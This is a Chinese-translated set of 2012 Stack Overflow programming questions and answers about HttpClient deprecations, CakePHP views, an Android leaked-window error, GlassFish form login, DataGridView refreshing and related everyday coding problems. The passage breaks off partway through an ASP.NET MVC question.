> 
> 标签：java, http

我是新的java。我创建了一个 java 项目来调用我的 web 服务（Servlet，Tomcat6.0）。
要使用 http，我添加了以下 jar 文件
1\. httpclient-4.2.1
2\. httpcore-4.2.1

对于下面的方法（粗体），我收到类型已弃用的警告并且无法运行该项目。

```
HTTP.**UTF_8**
aSchemeRegistryL.register(new **Scheme**("http", PlainSocketFactory.getSocketFactory(), 80));
ClientConnectionManager ccm = new **ThreadSafeClientConnManager**(aHttpParamsL, aSchemeRegistryL); 
```

帮我改正。

* * *

## 回答 #1

> 赞同：17
> 
> 时间：2013-06-16T13:01:11.463

对于`HTTP.UTF_8`替代方案是`Consts.UTF_8`。奇怪的是他们没有在文档中提到这一点......

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-13T13:38:14.347

大多数时候 - 检查你的 java 文档 - 他们会建议一个替代类。请参阅： [ThreadSafeClientManager](http://hc.apache.org/httpcomponents-client-ga/httpclient/apidocs/org/apache/http/impl/conn/tsccm/ThreadSafeClientConnManager.html)

它会建议代替 ThreadSafeClientManager 使用： PoolingClientConnectionManager

[PoolingClientConnectionManager](http://hc.apache.org/httpcomponents-client-ga/httpclient/apidocs/org/apache/http/impl/conn/PoolingClientConnectionManager.html)

至于 Scheme 类，如果您查看 javadocs，该类本身并未被弃用，但您使用的构造函数是： [Scheme](http://hc.apache.org/httpcomponents-client-ga/httpclient/apidocs/org/apache/http/conn/scheme/Scheme.html)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-13T13:39:37.947

ThreadSafeClientConnManager 类已弃用，使用`PoolingClientConnectionManager`和`Scheme`您正在使用的构造函数也已弃用，请使用该类中的其他构造函数。

至于不推荐使用的警告，请在 Eclipse 中检查（我假设您使用的是 Eclipse，否则检查您的 IDE 中的类似选项），在 Preferences->Java->Compiler->Errors/Warnings 下您没有“不推荐使用的 API”设置为“错误”状态。

# php - 如何在常规视图中放置属于插件的视图（CakePHP Howto）

> ID：11935302
> 
> 赞同：0
> 
> 时间：2012-08-13T13:32:06.737
> 
> 标签：php, templates, cakephp, plugins, cakephp-2.0

我想就以下场景/设计模式的可行性获得一些意见：

我想将`View`一个类别插件 ( `/category/categories/tree`) 中的一个插入我的应用程序视图 ( `/posts/edit/3`) 之一，就好像它是一个 CakePHP 元素一样。
插入`View`的具有高级别的功能（排序、添加、删除等），因此简单地调用`echo $this->element();`对我来说似乎不合适。这“感觉”更像是一种适合需要“片段”/较低级别功能的情况的做法。

我的问题：这在 CakePHP 中是否可能，如果是这样：如何做到这一点？（只是一个粗略的方法就足够了）我的第一个想法是从插件
中调用一个并从元素中使用。 但正如我之前所说，我与小功能/片段之一的元素相关联。使用控制器方法及其“感觉”更合适。但我不知道如何在视图中“调用”视图。`element``$this->requestAction();`
`View`

我想要这个的主要原因：
完整的控制器功能。

*   根据插件要求激活助手（这应该与帖子控制器无关）
*   插件的 beforeFilter 和 beforeRender 可能有用。例如：`$this->set('modelName', $this->modelClass);`

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-13T13:57:51.853

你可以看看使用[视图块](http://book.cakephp.org/2.0/en/views.html#view-blocks)。AFAIK，它们通常旨在帮助解决更复杂的视图构造，例如您在此处考虑的问题。

或者直接调用[插件元素](http://book.cakephp.org/2.0/en/views.html#requesting-elements-from-a-plugin)。

# android - Activity 在 Alertdialog 关闭之前关闭并给出 Activity Leaked 窗口异常

> ID：11935309
> 
> 赞同：-1
> 
> 时间：2012-08-13T13:32:20.620
> 
> 标签：android

在 onPostExecute 我试图显示处理程序，但它给出异常 Activity 已泄漏窗口。错误点在代码下方突出显示。这个问题有什么解决办法。

```
 class Communicator extends AsyncTask<String, String, String> 
            {
                int prog = 0;

                @Override
                protected String doInBackground(String... params) {
                    String response = null;
                    try {
                        if(Login.uname != null && Login.pass != null){
                        sync(Login.uname, Login.pass);
                        }else if(SplashScreen.user != null && SplashScreen.pas != null){
                            sync(SplashScreen.user, SplashScreen.pas);
                        }
                        if("ok".equalsIgnoreCase(status))
                        {
                            if(memoryInfo(true)){
                                AlertDialog alert =new AlertDialog.Builder(NeliteMusicActivity.this).create();
                                alert.setTitle(R.string.set4Play);
                                alert.setMessage(getString(R.string.lowMemorySync));
                                alert.getWindow().clearFlags(WindowManager.LayoutParams.FLAG_DIM_BEHIND);
                                alert.setButton(getString(R.string.ok), new DialogInterface.OnClickListener() {
                                    @Override
                                    public void onClick(DialogInterface dialog, int which) {

                                    }
                                });
                                alert.setCanceledOnTouchOutside(false);
                                alert.show();
                            }else{
                            new Thread()
                            {   
                                @Override 
                                public void run()
                                {
                                    try{
                                    Data.filenames = new ArrayList<String>(); 
                                    for(int i = 0; i< list.size();i++)
                                    {
                                        if(mname.size() > i)
                                            mnam = mname.get(i);
                                        if(Login.uname != null && Login.pass != null){
                                            mp3Download(Login.uname, Login.pass, list.get(i), mnam);
                                        }
                                        if(SettingActivity.userna != null && SettingActivity.passwo != null){
                                            mp3Download(SettingActivity.userna, SettingActivity.passwo, list.get(i), mnam);
                                        }
                                        publishProgress("" + ((bytecopied1*100)/(totalsize)));
                                        c++;
                                        long b = bytecopied1*100;
                                        float a = b/totalsize;
                                        Message msg = my_handler.obtainMessage();
                                        msg.arg1 = (int)a;
                                        my_handler.sendMessage(msg);
                                        if(list.size() == c){
                                            isTrue = true;
                                        }
                                    }
                                    }catch (Exception e) {

                                    }
                                    super.run(); 
                                }
                            }.start();
                            }
                            count ++;
                        }
                        else if("tomany".equalsIgnoreCase(status))
                        {
                            AlertDialog alert =new AlertDialog.Builder(NeliteMusicActivity.this).create();
                            alert.setTitle(R.string.set4Play);
                            alert.setMessage(getString(R.string.tomany));
                            alert.getWindow().clearFlags(WindowManager.LayoutParams.FLAG_DIM_BEHIND);
                            alert.setButton(getString(R.string.ok), new DialogInterface.OnClickListener() {
                                @Override
                                public void onClick(DialogInterface dialog, int which) {

                                }
                            });
                            alert.setCanceledOnTouchOutside(false);
                            alert.show();
                        }
                        else if("fail".equalsIgnoreCase(status))
                        {
                            AlertDialog alert =new AlertDialog.Builder(NeliteMusicActivity.this).create();
                            alert.setTitle(R.string.set4Play);
                            alert.setMessage(getString(R.string.connectionerror));
                            alert.getWindow().clearFlags(WindowManager.LayoutParams.FLAG_DIM_BEHIND);
                            alert.setButton(getString(R.string.ok), new DialogInterface.OnClickListener() {
                                @Override
                                public void onClick(DialogInterface dialog, int which) {
                                    Intent backintent = new Intent(NeliteMusicActivity.this, HomeScreen.class);
                                    startActivity(backintent);
                                    return;
                                }
                            });
                            alert.setCanceledOnTouchOutside(false);
                            alert.show();
                        }
                        totalsize = 0;
                        for(int i=0; i<list.size(); i++)
                        {
                            totalsize += Integer.parseInt(cont.get(i).getSize()); 
                        }

                    } catch (Exception e) {
                        Log.e("Data.LOG", e.getMessage(), e);

                    } finally {
                    }
                    return response;
                }

                @Override
                protected void onPreExecute() {
                    prog = 0;
                    super.onPreExecute();
                }

                @Override
                protected void onPostExecute(String result) {
                    super.onPostExecute(result);

                    if ("ok".equalsIgnoreCase(status)) 
                    {
                        sizekb=0;
                        new Set4Play13(getBaseContext());
                        sizeall =  new Integer[cont.size()];
                        for (int i = 0; i < cont.size(); i++) {
                            mixname = cont.get(i).getMixname();
                            mixnumber = cont.get(i).getNumber();
                            int size = Integer.parseInt(cont.get(i).getSize());

                             sizekb= sizekb+size;
                             sizeall[i] = size;

                            db.addContact(new Dataset(cont.get(i).getNumber(), cont
                                    .get(i).getUsername(), cont.get(i).getMixname(),
                                    cont.get(i).getSize(), cont.get(i).getUpdate(),
                                    cont.get(i).getKg()));
                            Log.e("cont.get(i).getKg()", "cont.get(i).getKg()"+cont.get(i).getKg());
                        }
                    }
                }

                private Handler my_handler = new Handler() 
                {

                    public void handleMessage(Message msg) 
                    {
                        int a=msg.arg1;
                        progress.setProgress(a);
                        textsync.setText("Syncing mix "+c);
                        if(progress.getMax()<=a)
                        {
                            if (isOnline()) 
                                {
                                    AlertDialog alert =new AlertDialog.Builder(NeliteMusicActivity.this).create();
                                    alert.setTitle(R.string.set4Play);
                                    alert.setMessage(getString(R.string.updatedMix));
                                    alert.getWindow().clearFlags(WindowManager.LayoutParams.FLAG_DIM_BEHIND);
                                    alert.setButton(getString(R.string.ok), 
                                            new DialogInterface.OnClickListener() 
                                    {
                                          public void onClick(DialogInterface dialog, int which) {
                                              dialog.dismiss();
                                              animatedStartActivity();
                                        }
                                        });
                                    alert.setCanceledOnTouchOutside(false);
                                    alert.show();(Here is the Error)
                                }
                            if (!isOnline()) {
                                AlertDialog alert =new AlertDialog.Builder(NeliteMusicActivity.this).create();
                                alert.setTitle(R.string.set4Play);
                                alert.setMessage(getString(R.string.connectionerror));
                                alert.getWindow().clearFlags(WindowManager.LayoutParams.FLAG_DIM_BEHIND);
                                alert.setButton(getString(R.string.ok), new DialogInterface.OnClickListener() {
                                      public void onClick(DialogInterface dialog, int which) {
                                           Intent intent = new Intent(getApplicationContext(),HomeScreen.class);
                            intent.addFlags(Intent.FLAG_ACTIVITY_NO_ANIMATION);
                            startActivity(intent);
                            finish();
                                    } 
                                    }); 
                                alert.setCanceledOnTouchOutside(false);
                                alert.show();
                            }
                        }
                        super.handleMessage(msg);
                    }
                };
            } 
```

日志猫：

```
10-13 18:53:20.220: E/WindowManager(4530): Activity com.nelitemusic.NeliteMusicActivity has leaked window com.android.internal.policy.impl.PhoneWindow$DecorView@40c2d8f8 that was originally added here
10-13 18:53:20.220: E/WindowManager(4530): android.view.WindowLeaked: Activity com.nelitemusic.NeliteMusicActivity has leaked window com.android.internal.policy.impl.PhoneWindow$DecorView@40c2d8f8 that was originally added here
10-13 18:53:20.220: E/WindowManager(4530):  at android.view.ViewRoot.<init>(ViewRoot.java:291)
10-13 18:53:20.220: E/WindowManager(4530):  at android.view.WindowManagerImpl.addView(WindowManagerImpl.java:249)
10-13 18:53:20.220: E/WindowManager(4530):  at android.view.WindowManagerImpl.addView(WindowManagerImpl.java:193)
10-13 18:53:20.220: E/WindowManager(4530):  at android.view.WindowManagerImpl$CompatModeWrapper.addView(WindowManagerImpl.java:118)
10-13 18:53:20.220: E/WindowManager(4530):  at android.view.Window$LocalWindowManager.addView(Window.java:532)
10-13 18:53:20.220: E/WindowManager(4530):  at android.app.Dialog.show(Dialog.java:269)
10-13 18:53:20.220: E/WindowManager(4530):  at com.nelitemusic.NeliteMusicActivity$Communicator$1.handleMessage(NeliteMusicActivity.java:372)
10-13 18:53:20.220: E/WindowManager(4530):  at android.os.Handler.dispatchMessage(Handler.java:99)
10-13 18:53:20.220: E/WindowManager(4530):  at android.os.Looper.loop(Looper.java:132)
10-13 18:53:20.220: E/WindowManager(4530):  at android.app.ActivityThread.main(ActivityThread.java:4126)
10-13 18:53:20.220: E/WindowManager(4530):  at java.lang.reflect.Method.invokeNative(Native Method)
10-13 18:53:20.220: E/WindowManager(4530):  at java.lang.reflect.Method.invoke(Method.java:491)
10-13 18:53:20.220: E/WindowManager(4530):  at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:844)
10-13 18:53:20.220: E/WindowManager(4530):  at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:602)
10-13 18:53:20.220: E/WindowManager(4530):  at dalvik.system.NativeStart.main(Native Method)
10-13 18:53:20.220: E/WindowManager(4530): Activity com.nelitemusic.NeliteMusicActivity has leaked window com.android.internal.policy.impl.PhoneWindow$DecorView@40b35838 that was originally added here
10-13 18:53:20.220: E/WindowManager(4530): android.view.WindowLeaked: Activity com.nelitemusic.NeliteMusicActivity has leaked window com.android.internal.policy.impl.PhoneWindow$DecorView@40b35838 that was originally added here
10-13 18:53:20.220: E/WindowManager(4530):  at android.view.ViewRoot.<init>(ViewRoot.java:291)
10-13 18:53:20.220: E/WindowManager(4530):  at android.view.WindowManagerImpl.addView(WindowManagerImpl.java:249)
10-13 18:53:20.220: E/WindowManager(4530):  at android.view.WindowManagerImpl.addView(WindowManagerImpl.java:193)
10-13 18:53:20.220: E/WindowManager(4530):  at android.view.WindowManagerImpl$CompatModeWrapper.addView(WindowManagerImpl.java:118)
10-13 18:53:20.220: E/WindowManager(4530):  at android.view.Window$LocalWindowManager.addView(Window.java:532)
10-13 18:53:20.220: E/WindowManager(4530):  at android.app.Dialog.show(Dialog.java:269)
10-13 18:53:20.220: E/WindowManager(4530):  at com.nelitemusic.NeliteMusicActivity$Communicator$1.handleMessage(NeliteMusicActivity.java:372)
10-13 18:53:20.220: E/WindowManager(4530):  at android.os.Handler.dispatchMessage(Handler.java:99)
10-13 18:53:20.220: E/WindowManager(4530):  at android.os.Looper.loop(Looper.java:132)
10-13 18:53:20.220: E/WindowManager(4530):  at android.app.ActivityThread.main(ActivityThread.java:4126)
10-13 18:53:20.220: E/WindowManager(4530):  at java.lang.reflect.Method.invokeNative(Native Method)
10-13 18:53:20.220: E/WindowManager(4530):  at java.lang.reflect.Method.invoke(Method.java:491)
10-13 18:53:20.220: E/WindowManager(4530):  at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:844)
10-13 18:53:20.220: E/WindowManager(4530):  at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:602)
10-13 18:53:20.220: E/WindowManager(4530):  at dalvik.system.NativeStart.main(Native Method)
10-13 18:53:20.720: E/<<path>>(4530): >>path<<file://mnt/sdcard/NeliteMusic/sponsormix.mp3
10-13 18:53:20.720: E/<<Login Start>>(4530): >>Login Start<<
10-13 18:53:21.100: E/<<path>>(4530): >>path<<file://mnt/sdcard/NeliteMusic/sponsormix.mp3
10-13 18:53:21.100: E/<<SettingActivity Start>>(4530): >>SettingActivity Start<< 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-13T14:24:33.613

当您在活动有效完成后尝试显示警报时，会出现“活动已泄漏最初添加的窗口...”错误。请参阅[最初添加的 Activity 已泄漏窗口](https://stackoverflow.com/questions/2850573/activity-has-leaked-window-that-was-originally-added)。

你有两个选项AFAIK：

1.  重新考虑您的警报登录：在实际退出您的活动之前在对话框上调用dismiss()。
2.  将对话框放在不同的线程中并在该线程上运行它（独立于当前活动）。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-13T13:47:42.073

尝试使用[DialogFragment](http://developer.android.com/reference/android/app/DialogFragment.html)而不是 Dialog。他们更好地处理生命周期。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-13T14:40:13.027

好的，让我给出一些基本的想法来在更新时显示对话框，

```
class Communicator extends AsyncTask<String, Integer, String> 
{
    int prog = 0;

    @Override
    protected String doInBackground(String... params) {
        String response = null;
        try {
            if(Login.uname != null && Login.pass != null){
            sync(Login.uname, Login.pass);
            }else if(SplashScreen.user != null && SplashScreen.pas != null){
                sync(SplashScreen.user, SplashScreen.pas);
            }
            if("ok".equalsIgnoreCase(status))
            {
                if(memoryInfo(true)){
                    publishProgress(LOW_MEMORY);
                    return (null);
                }else{..... 
```

用于显示对话框

```
protected void onProgressUpdate(Integer... statusCode) {
    switch (statusCode[0]) {
    case LOW_MEMORY:
        AlertDialog alert =new AlertDialog.Builder(NeliteMusicActivity.this).create();
        alert.setTitle(R.string.set4Play);
        alert.setMessage(getString(R.string.lowMemorySync));
        alert.getWindow().clearFlags(WindowManager.LayoutParams.FLAG_DIM_BEHIND);
        alert.setButton(getString(R.string.ok), new DialogInterface.OnClickListener() {
            @Override
            public void onClick(DialogInterface dialog, int which) {
                alert.dismiss();
            }
        });
        alert.setCanceledOnTouchOutside(false);
        alert.show();
        break;
    }
} 
```

希望这会有意义

# java - Java 使用 j_security_check 和 Glassfish 形成身份验证

> ID：11935310
> 
> 赞同：0
> 
> 时间：2012-08-13T13:32:24.143
> 
> 标签：java, glassfish-3, netbeans-7, j-security-check

我正在涉足 Java 的浑浊水域，并且正在研究 PackPub JavaEE 6 With Netbeans7[这本书](http://www.packtpub.com/java-ee-6-development-with-netbeans-7/book/ "书")。早期的示例之一是表单身份验证，它涉及使用安全角色“管理员”和约束设置部署描述符 (web.xml)。然后，它会引导您通过将这些角色分配给新组，然后使用 Glassfish 控制台在这些组中创建新用户来获取 Glassfish 描述符。

当我尝试访问此受保护页面中的页面时，会按预期显示登录页面，但我的登录无效。即使我知道我正在输入在 glassfish 控制台中创建的有效凭据，我仍然会得到我的登录错误页面（在 j_security_check URL 上呈现）。

登录页面非常基本：

```
 <%@page contentType="text/html" pageEncoding="UTF-8"%>
<!DOCTYPE html>
<html>
    <head>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        <title>Log in to view secure content</title>
    </head>
    <body>
        <h1>Log in</h1>
        <form action="j_security_check" method="POST">
            <table border="0">
                <tbody>
                    <tr>
                        <td slign="right">Username: &nbsp;</td>
                        <td><input type="text" name="j_username" value="" /></td>
                    </tr>
                    <tr>
                        <td slign="right">Password: &nbsp;</td>
                        <td><input type="password" name="j_password" value="" /></td>
                    </tr>
                    <tr>
                        <td></td>
                        <td><input type="submit" value="Login" /></td>
                    </tr>
                </tbody>
            </table>

        </form>
    </body>
</html> 
```

我没有配置一些东西，它可能是一些非常基本的东西，但是这本书对诸如此类的问题没有帮助，所以想知道我是否可以得到一些关于从哪里开始调试或诊断这个问题的指示。

我的 web.xml 是：

```
<?xml version="1.0" encoding="UTF-8"?>
<web-app version="3.0" xmlns="http://java.sun.com/xml/ns/javaee" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://java.sun.com/xml/ns/javaee http://java.sun.com/xml/ns/javaee/web-app_3_0.xsd">
    <session-config>
        <session-timeout>
            30
        </session-timeout>
    </session-config>
    <security-constraint>
        <display-name>Admin Pages</display-name>
        <web-resource-collection>
            <web-resource-name>Administrative pages</web-resource-name>
            <description/>
            <url-pattern>/admin/*</url-pattern>
        </web-resource-collection>
        <auth-constraint>
            <description/>
            <role-name>Admin</role-name>
        </auth-constraint>
    </security-constraint>
    <login-config>
        <auth-method>FORM</auth-method>
        <realm-name>file</realm-name>
        <form-login-config>
            <form-login-page>/login.jsp</form-login-page>
            <form-error-page>/loginerror.jsp</form-error-page>
        </form-login-config>
    </login-config>
    <security-role>
        <description>Administrators</description>
        <role-name>Admin</role-name>
    </security-role>
    <security-role>
        <description>public user</description>
        <role-name>User</role-name>
    </security-role>
</web-app> 
```

glassfish-web.xml

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE glassfish-web-app PUBLIC "-//GlassFish.org//DTD GlassFish Application Server 3.1 Servlet 3.0//EN" "http://glassfish.org/dtds/glassfish-web-app_3_0-1.dtd">
<glassfish-web-app error-url="">
  <security-role-mapping>
    <role-name>Admin</role-name>
    <group-name>Admin</group-name>
  </security-role-mapping>
  <class-loader delegate="true"/>
  <jsp-config>
    <property name="keepgenerated" value="true">
      <description>Keep a copy of the generated servlet class' java code.</description>
    </property>
  </jsp-config>
</glassfish-web-app> 
```

我在 Glassfish 控制台中仔细检查过，我正在编辑

```
Configuartions|Security|Realms|file 
```

并且我的新用户有一个“管理员”组列表

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-13T13:35:34.160

你在使用自定义登录页面吗？

如果你配置了所有的东西，也看看你的登录页面，你应该有类似的东西

```
<form method="POST" action="j_security_check">
    <input type="submit">
    <!-- more code -->
</form> 
```

尝试

```
<login-config>    
  <auth-method>BASIC</auth-method>    
  <realm-name>file</realm-name>  
</login-config> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2015-01-09T15:48:14.163

是的。大约 2 年前，但我遇到了同样的问题并找到了解决方案。尽管我已经安装了正确版本的 Netbeans (7.0) 和正确版本的 jdk (1.6.0_45) 以遵循本书，但 Netbeans 附带 glassfish 3.1。所以我所做的是从 Netbeans 中删除 glassfish 服务器，将其卸载，然后安装 glashfish 3.0.1，所以现在我的示例运行良好。不要忘记以系统管理员身份执行 Netbeans。

# c# - 如果不重新启动，我无法在 Datagridview 中看到新元素

> ID：11935312
> 
> 赞同：4
> 
> 时间：2012-08-13T13:32:30.497
> 
> 标签：c#, winforms, datagridview

我已经向底层数据库添加了一条记录，添加记录后我执行了 datagridview.Refresh(); 而且我没有看到新添加的记录。

如果我停止并启动应用程序，它就在那里。我在做什么或不做什么？注意：button1 和 datagridview 的形式不同。我公开了 datagridview 的修饰符。这个项目是 ado.net 项目

```
public class CustomerService
{
    public List<Customers> ShowAll()
    {
        List<Customers> customers = new List<Customers>();
        SqlConnection conn = new SqlConnection("data source=.; database=custer; user id=sa; password=*****");
        SqlCommand cmd = new SqlCommand(" select * from Customers ", conn.Open());
        SqlDataReader dr = cmd.ExecuteReader();
        while (dr.Read())
        {
            Customer customer = new Customer ()
            {
                CustomerID = dr.GetInt32(0),
                CustomerName = dr.GetString(1),
                CustomerSurname = dr.GetString(2),
            };
            customers.Add(customer);
        }
        conn.Close();
        return customers;
    }
  }

    private void button1_Click(object sender, EventArgs e)
    {
        CustomerService service = new CustomerService();
        if (txtCustomerName.Text != "" || txtCustomerSurname.Text != "")
        {
            customerservice.customerAdd(txtCustomerName.Text, txtCustomerSurname.Text);//this rows is other method .I am using for adding new customer 
            MessageBox.Show("Customer Added");
            Form1.dataGridView1.DataSource = service.ShowAll();
            Form1.dataGridView1.Refresh();
        }
        else
        {
            //……………
        }
    } 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-14T07:07:43.400

将数据添加到数据库后，您的应用程序对添加的数据一无所知。您需要将这些数据加载到内存中。在对数据库执行操作后，从数据库中检索要显示的所有数据并将其显式绑定到 UI。

**编辑**：

**你能在调试时检查 ShowAll() 返回的内容吗？它会返回您真正想要的数据吗？**

如果它是 WPF 应用程序，请查看[此处](http://www.codeproject.com/Articles/15822/Bind-Better-with-INotifyPropertyChanged)。这里的问题是告诉您的 UI 组件底层数据源已更改，因此 UI 组件反映对数据所做的更改。

同样，如果它是 WPF 应用程序，您可以将数据定义为 ObservableCollection 并将您的 UI 绑定到此集合。ObservableCollection 在数据发生变化时自动请求 UI 刷新。

Rica ederim。）

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-13T14:11:55.053

这样做的通常方法是重置`DataSource`.`DataGridView`

试试这个代码（使用正确的代码来提供正确的数据源）：

```
Form1.dataGridView1.DataSource = typeof(List); 
Form1.dataGridView1.DataSource = service.ShowAll(); 
```

调用`.Refresh()`不起作用，因为它只强制重新绘制，但绘制网格的代码不知道更改。

也请参考此 WPF 链接，这可能会对您有所帮助：

[为什么更改 ItemsSource 时 DataGrid 不更新？](https://stackoverflow.com/questions/7059070/why-does-the-datagrid-not-update-when-the-itemssource-is-changed)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-22T23:25:44.790

您只需要对每条新记录进行一次数据绑定。这就是将数据绑定到所有更改都会自动反映的控件的全部意义。

1.  `customers`创建该类的数据成员 并适当地更改`CustomerService`您的代码：

    ```
    class CustomerService {
        List<Customers> customers;
        ...
    } 
    ```

2.  接下来绑定代码应该完成一次，可能是在将第一条记录添加到`List<Customers>`.

    ```
    BindingSource binding = new BindingSource();
    binding.DataSource = customers;
    dataGridView1.DataSource = binding; 
    ```

如果您已正确执行此操作，则每次删除或添加到客户集合中的任何记录时，都应自动反映在`DataGridView`控件中。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-08-20T21:43:21.483

正如你所说，这些形式不同，我认为指向 Form1 的指针并不指向你想要的形式。您应该将该表单的指针传递`this`给该表单。

当您创建表单 2 时，定义如下：

```
Form2 = new Form2();
Form2.form1 = this; 
```

然后你的代码应该可以工作。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-08-16T11:31:20.120

customerservice.customerAdd 的内容是什么？也许它没有正确关闭连接/没有将数据刷新到数据库中，并且仅在您关闭应用程序时才会发生（所有内存都已释放，并且所有连接都已关闭/刷新）。

另外 - 我建议使用网格绑定到的 BindingSource 并更改其数据源 - 如果其数据源已更改并且将导致其刷新，它具有自动通知网格的事件。

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2012-08-21T19:00:07.717

看来您正在使用 List 作为数据源。我发现使用通用列表对于只读数据是可以的，但对于进行任何类型的更新，您需要更强大的东西。我不了解 WPF，但在 winForms 中，我在 IBindingList 接口和 BindingList 泛型集合方面取得了巨大成功。BindingList 泛型集合为您实现了 IBindingList 接口。我会阅读关于它们的 MSDN 文章。我几乎已经停止使用 IBindingList 接口，但它仍然可以很好地实现。

[http://msdn.microsoft.com/en-us/library/system.componentmodel.ibindinglist.aspx](http://msdn.microsoft.com/en-us/library/system.componentmodel.ibindinglist.aspx)

[http://msdn.microsoft.com/en-us/library/ms132679.aspx](http://msdn.microsoft.com/en-us/library/ms132679.aspx)

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2012-08-22T15:36:29.067

如果您将 List 更改为 BindingList，您将获得成功。我将一个示例放在一起，该示例在表单上只有一个 DataGridView 和几个按钮。

button1 生成一些假数据并分配数据源。button2 将另一个客户添加到基础列表中。

DataGridView 会在基础 BindingList 更改时更新。

代码：

```
public class Customer
{
    public int Id { get; set; }
    public string Name { get; set; }
    public string SurName { get; set; }
}

public partial class Form1 : Form
{
    BindingList<Customer> customers = new BindingList<Customer>();
    public Form1()
    {
        InitializeComponent();
    }

    private void button1_Click(object sender, EventArgs e)
    {
        for (int i = 0; i < 10; ++i)
        {
            customers.Add(new Customer
            {
                Id = i,
                Name = "Name" + i,
                SurName = "Surname" + i
            });
        }
        dataGridView1.DataSource = customers;
    }

    private void button2_Click(object sender, EventArgs e)
    {
        customers.Add(new Customer
        {
            Id = 22,
            Name = "Newname",
            SurName = "Newsurname"
        });
    }
} 
```

现在，它起作用的原因是它`BindingList<T>`实现`IBindingList`了，除其他外，该接口还具有一个被调用的事件`ListChanged`，当列表或列表中的某些内容发生更改时会引发该事件。

* * *

## 回答 #8

> 赞同：1
> 
> 时间：2012-08-23T05:43:21.917

**我想这会解决你的问题，检查这个......**

```
DataGrid.CommitEdit();
DataGrid.Items.Refresh(); 
```

**笔记**

> CommitEdit() 方法将触发 RowEditEnding 事件，这是一个**无限循环**。WPF 不允许在编辑时刷新视图，因为它可能会发生无限循环。但是，您可以在编辑后刷新视图。尝试删除 RowEditEnding 事件处理程序 (If Initialzed) ，并刷新项目；然后重新添加事件处理程序：

* * *

## 回答 #9

> 赞同：1
> 
> 时间：2012-08-23T05:38:32.310

我认为您一定使用过更新面板并且可能不会刷新它

* * *

## 回答 #10

> 赞同：1
> 
> 时间：2012-08-13T13:36:40.857

尝试在 datagridview 上调用 EndEdit：

```
this.dataGridView1.EndEdit(); 
```

二、刷新网格视图：

```
this.dataGridView1.Refresh(); 
```

如果这仍然不起作用，请尝试在包含控件上调用 Refresh

```
ParentControl.Refresh() 
```

这最终会调用可能需要的重绘。

* * *

## 回答 #11

> 赞同：1
> 
> 时间：2012-08-22T21:06:46.797

如果您不必严格使用客户列表作为 datagridview 的数据源，那么这里是使用数据表的更好的解决方案。插入后您将获得更新的客户列表和 datagridview

```
public class CustomerService
{
  public DataTable ShowCustomers()
  {
    string cns = "data source=.; database=custer; user id=sa; password=*****";
    SqlConnection conn = new SqlConnection(cns);
    SqlDataAdapter da = new SqDataAdapter("select * from Customers", conn);
    DataTable dt = new DataTable();
    da.Fill(dt);
    return dt;
  }
}    
private void button1_Click(object sender, EventArgs e)
{
   CustomerService service = new CustomerService();
   if (txtCustomerName.Text != "" || txtCustomerSurname.Text != "")
   {
     customerservice.customerAdd(txtCustomerName.Text,txtCustomerSurname.Text);
      MessageBox.Show("Customer Added");
      DataTable dt = service.ShowCustomers();
      Form1.dataGridView1.DataSource = dt;
      //If you also need customer list. Provide the DataTable and get list
      List<Customers> customers = new List<Customers>();        
      for (int i=0;i<dt.Rows.Count;i++)
      {
        Customer customer = new Customer();            
        customer.CustomerID = Convert.ToInt32(dt.Rows[i][0]);
        customer.CustomerName = dt.Rows[i][1].ToString();
        customer.CustomerSurname = dt.Rows[i][2].ToString();
        customers.Add(customer);
      }
   }
} 
```

* * *

## 回答 #12

> 赞同：1
> 
> 时间：2012-08-22T12:50:39.793

答案是让 gridview 连接到`BindingList<Customers>`而不是`List<Customers>`. 希望这能解决您的问题...

# java - 添加到数组列表

> ID：11935316
> 
> 赞同：0
> 
> 时间：2012-08-13T13:32:36.330
> 
> 标签：java, android

这是我的代码的一部分：

```
int n= random.nextInt(images.length - 1);        
iv.setImageResource(images[n]); 
```

`Int n`随机选择一个索引，然后我`ImageResource`根据随机索引显示图片。现在我想添加`n`到`ArrayList`. 我该怎么做？有没有更好的方法在android的内存中保存一个值？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-13T13:36:05.113

声明一个如下所示的 ArrayList，

```
ArrayList<Integer> list = new ArrayList<Integer>(); 
```

一旦你设置了图像，就将它添加到你的 ArrayList 中，

```
int n = random.nextInt(images.length - 1);        
iv.setImageResource(images[n]);  
list.add(n); 
```

# asp.net-mvc - 如何在 ASP.NET MVC 架构中更新 ButtonClick 上的数据库

> ID：11935318
> 
> 赞同：0
> 
> 时间：2012-08-13T13:32:38.017
> 
> 标签：asp.net-mvc, razor

嗨，我希望从我的视图中捕获值并将输入的值更新到我的数据库中。

我的观点如下：

```
@using Kendo.Mvc.UI 
@{
    Layout = null;
}

<!DOCTYPE html>

<html>
<head>
    <meta name="viewport" content="width=device-width" />
    <title>Facility</title>
</head>
<body>
    <div>
       <p>Create a new Facilty</p>
        <table width="100px">
        <tr>
        <td>
        <label for="TenantId">TenantID:</label>
        </td>
        <td>
        <input id="TextTenantId" type="text" />
        </td>
        </tr>
        <tr>
        <td>
        <label for="FacilityID">FacilityID:</label>
        </td>
        <td>
        <input id="TextFacilityID" type="text" />
        </td>
        </tr>
         <tr>
        <td>
       <label for="FacilityGroupID">FacilityGroupID:</label>
